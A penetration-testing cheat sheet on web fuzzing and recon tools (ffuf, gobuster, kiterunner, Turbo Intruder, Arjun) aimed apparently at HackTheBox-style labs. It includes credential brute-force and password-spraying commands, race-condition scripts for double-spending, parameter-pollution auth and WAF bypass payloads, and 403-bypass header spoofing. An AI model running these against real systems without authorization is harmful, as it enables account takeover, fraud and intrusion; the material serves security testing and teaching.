# Fuzzing

#Fuzzing #ffuf #wfuzz #WebSecurity #recon #gobuster #feroxbuster #nuclei #dirsearch #kiterunner #katana #Arjun #nikto #GraphQL #JWT #WebSockets #WAFEvasion

## What is this?

Automated input injection to discover hidden endpoints, parameters, files, vhosts, and vulnerabilities. Core web recon technique — brute-force dirs/files/params/APIs, fuzz inputs for injection flaws, and map the attack surface before exploitation. Pairs with [[API Attacks]], [[GraphQL Attacks|GraphQL]], [[JWT Attacks]], [[WebSockets]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Scanning/ffuf\|ffuf]] | Fast web fuzzer — dirs, files, params, vhosts, headers |
| [[Tools/Scanning/gobuster\|gobuster]] | Dir/DNS/vhost brute force, S3 buckets |
| [[Tools/Scanning/feroxbuster\|feroxbuster]] | Recursive directory fuzzing with auto-filtering |
| [[Tools/Scanning/wfuzz\|wfuzz]] | Flexible web fuzzer, good for multi-position |
| [[Tools/Scanning/dirsearch\|dirsearch]] | Simple directory brute force |
| [[Tools/Web/Nikto\|nikto]] | Web server scanner — known vulns, misconfigs, interesting files |
| [[Tools/Scanning/nuclei\|nuclei]] | Template-based vuln/misconfig scanner |
| [[Tools/Web/Arjun\|arjun]] | Hidden GET/POST/JSON/XML parameter discovery |
| [[Tools/Scanning/kiterunner\|kiterunner]] | API-aware endpoint fuzzing (Assetnote .kite wordlists) |
| [[Tools/Recon/katana\|katana]] | Headless crawler — extracts endpoints from JS-heavy SPAs |
| [[Tools/Web/Burpsuite\|Burp Intruder]] | GUI fuzzing — 4 attack modes |
| [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) | Burp extension — high-speed fuzzing + race condition attacks |
| [Param Miner](https://github.com/PortSwigger/param-miner) | Burp extension — hidden param + header discovery |
| [InQL](https://github.com/doyensec/inql) | Burp extension — GraphQL schema analysis + fuzzing |
| [[Tools/Web/clairvoyance\|clairvoyance]] | GraphQL schema recovery when introspection disabled |
| [[Tools/Web/graphw00f\|graphw00f]] | Fingerprint GraphQL engine type |
| [[Tools/Web/wscat\|wscat]] | WebSocket CLI client for manual/fuzzing interaction |
| [[Tools/Web/jwt_tool\|jwt_tool]] | JWT decoding, tampering, and secret cracking |

---

## ffuf — Core Syntax

```bash
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt
```

`FUZZ` is the injection keyword — place it anywhere in the URL, headers, or body.

### Key Flags

| Flag | Description |
|---|---|
| `-u` | Target URL |
| `-w` | Wordlist (use `-w list1.txt -w list2.txt` for multiple) |
| `-w list.txt:KEYWORD` | Assign wordlist to a named keyword |
| `-X` | HTTP method (GET, POST, PUT, etc.) |
| `-d` | POST body data |
| `-H` | Header (`-H "Cookie: session=abc"`) |
| `-b` | Cookie string |
| `-e` | Extensions to append (`,php,.html,.txt`) |
| `-t` | Threads (default 40) |
| `-rate` | Max requests/sec |
| `-timeout` | Per-request timeout (seconds) |
| `-recursion` | Recursive fuzzing on found dirs |
| `-recursion-depth` | Max recursion depth |
| `-ic` | Ignore comments in wordlist |
| `-c` | Colorize output |
| `-v` | Verbose — show full URL in output |
| `-o` | Output file |
| `-of` | Output format: `json`, `csv`, `html`, `md` |
| `-ac` | Auto-calibrate filters (detect baseline, filter noise) |
| `-s` | Silent — no banner/stats |

### Matching / Filtering

| Flag | Description |
|---|---|
| `-mc` | Match status codes (`200,301,302,403`) |
| `-fc` | Filter status codes (`404,400`) |
| `-ms` | Match response size (bytes) |
| `-fs` | Filter response size |
| `-ml` | Match number of lines |
| `-fl` | Filter number of lines |
| `-mw` | Match word count |
| `-fw` | Filter word count |
| `-mr` | Match regex |
| `-fr` | Filter regex |

> **Tip:** Run once without filters first, note the 404/error response size, then add `-fs <size>` to remove noise.

---

## Directory Fuzzing

```bash
# Basic
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Filter 404 noise by size
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 0

# Match only interesting codes
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403

# Recursive
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 3 -mc 200,301,302,403

# Auto-calibrate (ffuf detects noise automatically)
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
```

---

## File / Extension Fuzzing

```bash
# Fuzz files with extension list
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302,403

# Append extensions to a word list
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt,.asp,.aspx,.jsp,.bak,.zip,.conf,.log -mc 200,301,302,403

# Two-step: find dirs first, then files inside
ffuf -u http://target.com/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -mc 200
```

---

## Parameter Fuzzing

### GET Parameters

```bash
# Fuzz parameter name
ffuf -u "http://target.com/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default_size>

# Fuzz parameter value
ffuf -u "http://target.com/search?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs <error_size>
```

### POST Parameters

```bash
# Fuzz POST param name
ffuf -u http://target.com/login -X POST -d "FUZZ=test&password=test" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <default_size>

# Fuzz POST param value
ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fc 401,403 -fs <fail_size>
```

---

## Virtual Host vs Subdomain Fuzzing — know which you're doing

These look identical but resolve completely differently, and picking the wrong one wastes a lot of time (especially on HTB). The deciding question: **is `FUZZ` in the `Host:` header, or in the hostname that has to be DNS-resolved?**

| | **Virtual Host fuzzing** | **Subdomain fuzzing** |
|---|---|---|
| Command shape | `-u http://target -H "Host: FUZZ.target.htb"` | `-u http://FUZZ.target.htb` |
| What resolves | The **base URL** resolves once (to the box IP, via `/etc/hosts` or DNS); only the `Host:` header changes per word | **Every word** must DNS-resolve `FUZZ.target.htb` independently |
| Needs working DNS for the words? | **No** — connection always hits the same IP | **Yes** — needs a real resolver / wildcard record |
| Finds | Name-based vhosts served by the same box (not in DNS) | Subdomains that actually have DNS records |
| HTB reality | ✅ **Use this** — you've mapped the domain in `/etc/hosts` | ❌ Usually fails — `/etc/hosts` has **no wildcards**, so unless the box runs its own DNS, nearly every request errors out |

> [!important] The `/etc/hosts` no-wildcard trap
> You add `10.129.x.x imagery.htb` to `/etc/hosts` and then run `ffuf -u http://FUZZ.imagery.htb ...` — and it fails on almost every word. `/etc/hosts` maps exact names only; it can't resolve `admin.imagery.htb`, `dev.imagery.htb`, etc. Only the **vhost** form works here, because ffuf connects to `imagery.htb`'s known IP and just varies the `Host:` header the server matches on. Reach for subdomain fuzzing only when there's a real DNS server answering (public recon, or a box explicitly running DNS).

```bash
# VHost fuzzing — the HTB default. Base URL is a name you've mapped in /etc/hosts (or an IP);
# FUZZ lives in the Host header, so the connection always succeeds.
ffuf -u http://imagery.htb -H "Host: FUZZ.imagery.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <default_size>

# HTTPS target — add -k to ignore cert errors
ffuf -u https://TARGET_IP -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size> -k
```

> [!tip] **Every vhost request returns the *default* site** (same size), so you can't filter by status code — filter by **response size/words** instead. Send one junk Host first (`-H "Host: doesnotexist.target.htb"`) to learn the default size, then `-fs <that_size>`; or let ffuf do it with **`-ac`** (auto-calibrate) / `-acc`. A hit is any word whose response *differs* from the default.

---

## Subdomain Fuzzing (needs real DNS)

Only works when `FUZZ.target.com` genuinely resolves — public-facing recon, or a target running a DNS server. On a typical `/etc/hosts`-mapped HTB box, use **vhost fuzzing above** instead.

```bash
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403

# With HTTPS
ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -k
```

For dedicated DNS-record enumeration (real resolver, `--show-ips`), `gobuster dns` / `puredns` are better suited — see the gobuster section below and [[Info Gathering]].

---

## Multiple Fuzz Positions

Use named keywords when fuzzing multiple positions simultaneously.

```bash
# Two wordlists — clusterbomb style
ffuf -u http://target.com/FOLDER/FILE.EXT -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FOLDER -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt:FILE -w extensions.txt:EXT -mc 200

# Credential brute force (username + password)
ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w usernames.txt:USER -w /usr/share/wordlists/rockyou.txt:PASS -fc 401 -fs <fail_size>
```

> **Warning:** Multiple wordlists = cartesian product of attempts. `100 users × 100 passwords = 10,000 requests`. Use `-mode clusterbomb` (default) or `-mode pitchfork` (pairs by line number).

```bash
# Pitchfork — pairs line 1 of list1 with line 1 of list2
ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt:USER -w passes.txt:PASS -mode pitchfork -fc 401
```

### Parameter Pollution

Send the same parameter multiple times — different frameworks handle duplicates differently, which can bypass validation, WAF rules, or access controls.

```bash
# HTTP Parameter Pollution (HPP) basics
# PHP: last value wins    → ?id=1&id=2  → id=2
# ASP.NET: first value wins → ?id=1&id=2  → id=1
# Node.js: array           → ?id=1&id=2  → id=['1','2']
# Flask: first value wins

# Auth bypass — if WAF checks first and app uses second (or vice versa)
curl "http://target.com/api/user?role=guest&role=admin"
curl "http://target.com/api/transfer?amount=1&amount=1000"

# WAF bypass — inject clean value first, malicious second
curl "http://target.com/search?q=hello&q=<script>alert(1)</script>"

# JSON body pollution
# Some parsers take the last key if duplicated
curl -X POST http://target.com/api -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'

# URL + body pollution
curl -X POST "http://target.com/login?admin=false" -d "admin=true"

# ffuf — fuzz the second value while fixing the first
ffuf -u "http://target.com/api/item?id=1&id=FUZZ" -w ids.txt -fs <normal_size>
```

> [!note] HPP is easy to miss — most scanners only send each param once. Always test duplicated params manually when you find an interesting access control endpoint.

---

## API Endpoint Fuzzing

```bash
# REST API path fuzzing
ffuf -u http://api.target.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403

# With auth header
ffuf -u http://api.target.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -mc 200,201,401,403

# Fuzz API version
ffuf -u http://api.target.com/FUZZ/users -w versions.txt -mc 200,401,403
# versions.txt: v1, v2, v3, api, api/v1, api/v2 ...

# JSON body fuzzing
ffuf -u http://api.target.com/login -X POST -d '{"username":"admin","password":"FUZZ"}' -H "Content-Type: application/json" -w /usr/share/wordlists/rockyou.txt -fr '"error"'
```

---

## HTTP Header Fuzzing

```bash
# User-Agent fuzzing
ffuf -u http://target.com/admin -H "User-Agent: FUZZ" -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -mc 200,302

# X-Forwarded-For bypass (no stock IP list — generate one)
# e.g.  seq 1 255 | sed 's/^/10.0.0./' > internal_ips.txt   (or add 127.0.0.1, 192.168.x.x)
ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w internal_ips.txt -mc 200,302

# Cookie value fuzzing
ffuf -u http://target.com/profile -b "session=FUZZ" -w sessions.txt -mc 200 -fs <unauth_size>
```

---

## Useful Wordlists (SecLists Paths)

| Wordlist | Use Case |
|---|---|
| `Discovery/Web-Content/raft-medium-directories.txt` | Directory brute force |
| `Discovery/Web-Content/raft-medium-files.txt` | File brute force |
| `Discovery/Web-Content/raft-medium-words-lowercase.txt` | Generic words + extensions |
| `Discovery/Web-Content/directory-list-2.3-medium.txt` | Dirbuster-style dirs |
| `Discovery/Web-Content/burp-parameter-names.txt` | GET/POST param names |
| `Discovery/Web-Content/api/api-endpoints.txt` | API endpoint names |
| `Discovery/DNS/subdomains-top1million-5000.txt` | Subdomain/vhost fuzzing |
| `Discovery/DNS/subdomains-top1million-110000.txt` | Thorough subdomain fuzzing |
| `Fuzzing/LFI/LFI-Jhaddix.txt` | LFI path traversal payloads |
| `Fuzzing/Databases/SQLi/Generic-SQLi.txt` | SQL injection payloads |
| `Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt` | XSS payloads |
| `Fuzzing/User-Agents/UserAgents.fuzz.txt` | User-agent strings |
| `Passwords/Default-Credentials/` | Default creds |

```bash
# Find SecLists on Kali
find /usr/share/seclists -name "*.txt" | grep -i "raft\|directory\|param"
ls /usr/share/seclists/Discovery/Web-Content/
ls /usr/share/seclists/Fuzzing/
```

---

## Crawling & JS Endpoint Extraction

Brute-forcing a single-page app usually returns nothing — there are no directories to find, because every route is client-side and every API path is a string inside a JavaScript bundle. **Crawl and read the JS before concluding the target has no attack surface.** This routinely finds endpoints no wordlist contains, including internal and deprecated ones.

### katana — headless crawler

```bash
# Standard crawl
katana -u https://target.com

# Headless mode — executes JS, so it sees routes a static crawler misses
katana -u https://target.com -headless -jc -d 3
# -jc = crawl JS files for endpoints, -d = depth

# Crawl authenticated, and keep it in scope
katana -u https://target.com -headless -jc \
  -H "Cookie: session=<token>" \
  -fs fqdn -o endpoints.txt

# Feed the results straight into a parameter or vuln pass
katana -u https://target.com -jc -silent | httpx -silent -mc 200 | tee live.txt
```

| Flag | Description |
|---|---|
| `-headless` | Drive a real browser — required for JS-rendered routes |
| `-jc` | Parse JavaScript files for endpoints |
| `-d` | Crawl depth |
| `-fs fqdn` | Scope filter — stay on the target's domain |
| `-kf robotstxt,sitemapxml` | Seed from known files |
| `-silent` | Machine-readable output for piping |

### Pull endpoints out of JS bundles by hand

```bash
# Collect every script the page references
curl -s https://target.com | grep -oE 'src="[^"]+\.js' | cut -d'"' -f2 > js.txt

# Grep each bundle for path-like strings and full URLs
while read -r j; do
  curl -s "https://target.com/$j" | grep -oE '"(/[a-zA-Z0-9_/.-]{3,})"' | tr -d '"'
done < js.txt | sort -u > js-endpoints.txt

# Also worth grepping for: api keys, internal hostnames, version strings
curl -s https://target.com/static/main.js | grep -oiE '(api[_-]?key|secret|token|bearer)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+' 
```

> [!tip] Source maps are the jackpot when present — a `//# sourceMappingURL=main.js.map` comment at the end of a bundle means you can reconstruct the app's original source, comments and all. Try fetching the `.map` file directly; teams frequently forget to strip them from production builds.

> [!note] Feed `js-endpoints.txt` back in as a wordlist (`ffuf -w js-endpoints.txt`) rather than treating it as a finished list — many extracted paths are fragments or need a prefix.

---

## Gobuster

Fast brute-forcer written in Go. Better than DirBuster/dirsearch for most cases, integrates well into pipelines.

```bash
# Install
sudo apt install gobuster
```

### dir — Directory / File Brute Force

```bash
# Basic
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,bak,zip,conf -t 50

# Filter status codes
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b 404,403 -t 50

# With cookies / auth header
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -c "session=abc123" -H "Authorization: Bearer <token>" -t 50

# HTTPS — ignore cert errors
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 50

# Output to file
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster_dirs.txt
```

**Key dir flags:**

| Flag | Description |
|---|---|
| `-u` | Target URL |
| `-w` | Wordlist |
| `-x` | Extensions (comma-separated) |
| `-t` | Threads (default 10) |
| `-b` | Blacklist status codes (hide) |
| `-s` | Whitelist status codes (show) |
| `-c` | Cookie string |
| `-H` | Custom header |
| `-k` | Skip TLS verification |
| `-r` | Follow redirects |
| `-e` | Print full URLs in output |
| `-q` | Quiet — no banner |
| `-o` | Output file |
| `--timeout` | Request timeout |
| `--delay` | Delay between requests (rate limiting) |

### dns — Subdomain Enumeration

```bash
# Basic subdomain brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Show IP addresses of discovered subdomains
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --show-ips

# Use specific DNS resolver
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 8.8.8.8 -t 50
```

### vhost — Virtual Host Enumeration

```bash
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Append domain automatically (Gobuster >= 3.2)
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50

# Filter by response size to remove noise
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250 -t 50
```

### fuzz — Generic Fuzzing Mode

```bash
# Fuzz any part of a URL
gobuster fuzz -u "http://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -b 404

# Fuzz GET parameter value
gobuster fuzz -u "http://target.com/page?id=FUZZ" -w ids.txt -b 400,404

# Fuzz subdomain in URL
gobuster fuzz -u "http://FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -b 404
```

### s3 — Amazon S3 Bucket Enumeration

```bash
gobuster s3 -w bucket_names.txt
```

---

## Kiterunner

API-aware fuzzer by Assetnote. Uses real-world API route schemas (`.kite` files) instead of generic wordlists — much better hit rate on REST/GraphQL APIs than ffuf with generic lists.

```bash
# Install
go install github.com/assetnote/kiterunner/cmd/kr@latest

# Or download release binary
# https://github.com/assetnote/kiterunner/releases
```

### Wordlists (.kite files)

```bash
# Download Assetnote API wordlists
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite

# Also usable: Assetnote's text-based API wordlists
wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2024_01_28.txt
```

### Basic Scan

```bash
# Scan with .kite wordlist
kr scan http://target.com -w routes-large.kite

# Scan with text wordlist
kr scan http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x 20

# Scan with auth header
kr scan http://target.com -w routes-large.kite -H "Authorization: Bearer <token>"

# Scan multiple targets
kr scan targets.txt -w routes-large.kite

# Output to file
kr scan http://target.com -w routes-large.kite -o results.txt
```

### Key Flags

| Flag | Description |
|---|---|
| `-w` | Wordlist (`.kite` or `.txt`) |
| `-x` | Concurrent requests (default 10) |
| `-H` | Custom header (repeatable) |
| `-A` | User-agent string |
| `--kitebuilder-full-scan` | Try all HTTP methods per route |
| `--fail-status-codes` | Codes to treat as failure (default: 400,401,404,403,501,502,426,411) |
| `--ignore-length` | Filter by response length |
| `--delay` | Delay between requests (ms) |
| `-o` | Output file |
| `--json` | JSON output |

### Replay in Burp

Found an interesting endpoint? Replay it through Burp for manual inspection:

```bash
# Route all kr traffic through Burp proxy
kr scan http://target.com -w routes-large.kite --proxy http://127.0.0.1:8080
```

### Brute API with Text Wordlist

```bash
# Use large Assetnote HTTP archive API routes
kr brute http://target.com -w httparchive_apiroutes_2024_01_28.txt -x 20 -H "Content-Type: application/json"
```

### Differences from ffuf

| | ffuf | Kiterunner |
|---|---|---|
| Wordlist format | Plain text | `.kite` (structured routes) or plain text |
| Method awareness | Manual (`-X`) | Tries correct methods per route automatically |
| API coverage | Generic paths | Real-world API routes from HTTP archive data |
| Speed | Very fast | Fast, purpose-built for APIs |
| Best for | Dirs, files, params, vhosts | API endpoint discovery |

---

## wfuzz

Alternative to ffuf — more flexible with payload types.

```bash
# Directory fuzzing
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://target.com/FUZZ

# POST body
wfuzz -c -w /usr/share/wordlists/rockyou.txt --hc 401 -d "username=admin&password=FUZZ" http://target.com/login

# Header fuzzing
wfuzz -c -w agents.txt -H "User-Agent: FUZZ" --hc 403 http://target.com/admin

# Multiple positions (pitchfork)
wfuzz -c -z file,users.txt -z file,passwords.txt --hc 401 -d "user=FUZZ&pass=FUZ2Z" http://target.com/login
```

**wfuzz filter flags:**

| Flag | Description |
|---|---|
| `--hc` | Hide response code |
| `--hl` | Hide by line count |
| `--hw` | Hide by word count |
| `--hh` | Hide by char count |
| `--sc` | Show only response code |
| `--sl` | Show only line count |

---

## Burp Suite Intruder

1. Intercept request → right-click → **Send to Intruder**
2. **Positions** tab → clear auto-marks → highlight injection point → **Add §**
3. **Payloads** tab → load wordlist
4. Attack types:
   - **Sniper** — single position, one list
   - **Battering Ram** — same payload in all positions simultaneously
   - **Pitchfork** — multiple positions, paired lists (line by line)
   - **Cluster Bomb** — multiple positions, all combinations
5. **Options** → set threads, redirects, grep match string
6. **Start Attack** → sort by Status / Length to find anomalies

> Community edition rate-limits Intruder to ~1 req/sec. Use ffuf/wfuzz for speed.

---

## Turbo Intruder

Burp extension for **high-speed** fuzzing and **race condition** testing. Bypasses the Community Intruder rate limit entirely — can send thousands of requests per second.

**Install:** Extender → BApp Store → search **Turbo Intruder** → Install

### Basic Usage

1. Intercept request → right-click → **Send to Turbo Intruder**
2. Mark injection point in request with `%s`
3. Select or write a Python script in the editor pane
4. Click **Attack**

### Built-in Script Templates

Turbo Intruder ships with ready-made scripts — select from the dropdown:

| Script | Use Case |
|---|---|
| `examples/basic.py` | Standard wordlist fuzzing |
| `examples/multipleParameters.py` | Fuzz multiple positions |
| `examples/sprayAndPray.py` | Password spraying |
| `examples/raceCondition.py` | Single-packet race condition attack |
| `examples/raceConditionFullSpeed.py` | Max-speed race condition |

### Standard Wordlist Fuzzing

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    for word in open('/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

### Password Spraying

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    for word in open('/usr/share/wordlists/rockyou.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if '302' in req.status or 'Invalid' not in req.response:
        table.add(req)
```

### Race Condition — Single Packet Attack

Sends all requests in a **single TCP packet** so the server processes them simultaneously. Used to exploit TOCTOU flaws (e.g., redeem coupon twice, double-spend, bypass rate limiting).

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue N identical requests — all arrive at the same time
    for i in range(20):
        engine.queue(target.req)

    # Gate releases all queued requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

> In the request pane, add `%s` somewhere (e.g., as a dummy param) even if not varying the payload — Turbo Intruder requires it.

### Key RequestEngine Options

| Option | Description |
|---|---|
| `concurrentConnections` | Parallel TCP connections |
| `requestsPerConnection` | Requests per connection (pipelining) |
| `pipeline` | HTTP/1.1 pipelining — faster but less compatible |
| `engine=Engine.HTTP2` | Use HTTP/2 (best for race conditions on H2 targets) |

```python
# HTTP/2 race condition (most reliable for modern targets)
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.HTTP2)
```

### Filtering Results

```python
def handleResponse(req, interesting):
    # Show only non-404
    if req.status != 404:
        table.add(req)

    # Match on response body
    if 'Welcome' in req.response or req.status == 302:
        table.add(req)

    # Filter by response length
    if len(req.response) > 5000:
        table.add(req)
```

---

## feroxbuster

Recursive content discovery with auto-filtering. Better than gobuster for deep enumeration — finds dirs then automatically fuzzes inside them.

```bash
# Install
sudo apt install feroxbuster
```

### Basic Usage

```bash
# Recursive (default depth 4)
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With extensions
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,bak,zip -t 50

# Limit recursion depth
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2 -t 50

# Filter noise by size
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --filter-size 0 --filter-status 404

# With cookies / auth
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b "session=abc123" -H "Authorization: Bearer <token>"

# HTTPS — ignore cert
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k

# Save + resume (useful for long scans)
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --output ferox_output.txt --resume-from ferox_output.txt
```

### Key Flags

| Flag | Description |
|---|---|
| `-u` | Target URL |
| `-w` | Wordlist |
| `-x` | Extensions |
| `-t` | Threads (default 50) |
| `--depth` | Recursion depth (default 4, 0=infinite) |
| `--filter-status` | Hide status codes |
| `--filter-size` | Hide by response size |
| `--filter-lines` | Hide by line count |
| `--filter-words` | Hide by word count |
| `--filter-regex` | Hide by regex match |
| `-b` | Cookie string |
| `-H` | Custom header |
| `-k` | Skip TLS verification |
| `-m` | HTTP methods (`GET,POST`) |
| `--auto-tune` | Auto-adjust concurrency |
| `--output` | Output file (also used for resume) |
| `--resume-from` | Resume a previous scan |
| `-q` | Quiet mode |

---

## Arjun — Hidden Parameter Discovery

Finds undocumented GET/POST/JSON/XML parameters. Smarter than just fuzzing because it compares responses to detect when a param actually changes behaviour.

```bash
# Install
pip3 install arjun
```

### Basic Usage

```bash
# GET parameter discovery
arjun -u http://target.com/search

# POST parameter discovery
arjun -u http://target.com/login -m POST

# JSON body
arjun -u http://target.com/api/user -m JSON

# XML body
arjun -u http://target.com/api -m XML

# With auth header
arjun -u http://target.com/api/profile -m GET -H "Authorization: Bearer <token>"

# Custom wordlist
arjun -u http://target.com/search -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Increase request rate
arjun -u http://target.com/search -t 10

# Output to JSON
arjun -u http://target.com/search -oJ results.json
```

### Key Flags

| Flag | Description |
|---|---|
| `-u` | Target URL |
| `-m` | Method: `GET`, `POST`, `JSON`, `XML` |
| `-H` | Custom header |
| `-d` | Add static POST data (`key=value`) |
| `-w` | Custom wordlist |
| `-t` | Threads |
| `-c` | Chunks per request (default 500) |
| `--stable` | Slower but more accurate |
| `-oJ` | JSON output |
| `-oT` | Text output |

---

## Param Miner (Burp Extension)

Finds hidden/unlinked parameters by mining JS files, page source, and wordlist brute-force. Detects params that alter responses even subtly.

**Install:** Extensions → BApp Store → **Param Miner**

### Usage

1. Right-click any request → **Extensions → Param Miner → Guess (all inputs)**
2. Or: right-click → **Guess params** → select GET / POST / headers
3. Results appear in the **Output** tab and **Issues** panel

### Options (right-click menu)

| Option | Description |
|---|---|
| `Guess GET params` | Brute-force query string parameters |
| `Guess POST params` | Brute-force body parameters |
| `Guess headers` | Find hidden/useful request headers |
| `Guess all inputs` | All of the above |
| `Mine words from response` | Build custom wordlist from page content |
| `Audit headers` | Check for header injection (Host, X-Forwarded-For, etc.) |

### Config (Extender → Extensions → Param Miner → Settings)

- **Add fcbz cachebuster** — appends random param to prevent caching interference
- **Learn observed words** — builds wordlist from responses during scan
- **Bump wordlist** — use larger built-in wordlist

> Param Miner is especially powerful combined with **Burp Scanner** — found params get automatically included in active scan.

---

## 403 Bypass Techniques

A 403 means the resource exists but access is denied — worth probing further.

### Path Normalization / Encoding

```bash
# Slash variations
curl http://target.com/admin/
curl http://target.com/admin/.
curl http://target.com/admin//
curl http://target.com/./admin/
curl http://target.com/admin/./
curl http://target.com/%2fadmin/
curl http://target.com/admin%2f

# Case variations
curl http://target.com/Admin
curl http://target.com/ADMIN
curl http://target.com/AdMiN

# Unicode / double encode
curl http://target.com/%61dmin          # %61 = 'a'
curl http://target.com/%2e%2e/admin
```

### Method Switching

```bash
curl -X POST http://target.com/admin
curl -X PUT http://target.com/admin
curl -X PATCH http://target.com/admin
curl -X HEAD http://target.com/admin    # check if 200 vs 403
curl -X OPTIONS http://target.com/admin
```

### Spoofed IP / Origin Headers

```bash
# Headers that may bypass IP-based restrictions
curl http://target.com/admin -H "X-Forwarded-For: 127.0.0.1"
curl http://target.com/admin -H "X-Forwarded-For: 192.168.1.1"
curl http://target.com/admin -H "X-Real-IP: 127.0.0.1"
curl http://target.com/admin -H "X-Custom-IP-Authorization: 127.0.0.1"
curl http://target.com/admin -H "X-Originating-IP: 127.0.0.1"
curl http://target.com/admin -H "Client-IP: 127.0.0.1"
curl http://target.com/admin -H "True-Client-IP: 127.0.0.1"
